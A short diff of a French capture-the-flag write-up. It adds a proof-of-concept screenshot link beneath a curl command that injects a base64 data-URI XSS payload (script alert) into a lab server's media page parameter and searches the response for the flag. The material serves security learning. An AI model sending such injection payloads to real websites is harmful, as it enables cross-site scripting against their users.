@@ -27,3 +27,5 @@ L'attaque a été réalisée via `curl` pour vérifier la réponse du serveur :
 curl -sG "[http://192.168.222.135/index.php](http://192.168.222.135/index.php)" \
 --data-urlencode "page=media" \
 --data-urlencode "src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" | findstr "flag"
+
+![Page Media NSA](screenshot/Preuve de Concept (PoC).png)
